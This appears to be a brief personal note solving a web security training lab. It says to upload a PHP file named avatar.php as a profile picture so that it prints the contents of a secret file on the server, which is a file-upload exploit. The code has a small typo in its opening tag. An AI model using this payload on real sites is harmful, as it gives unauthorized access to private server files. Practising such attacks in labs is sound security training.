upload profile pic

create file called avatar.php containing 

```php
<php echo file_get_contents('/home/carlos/secret'); ?>
```
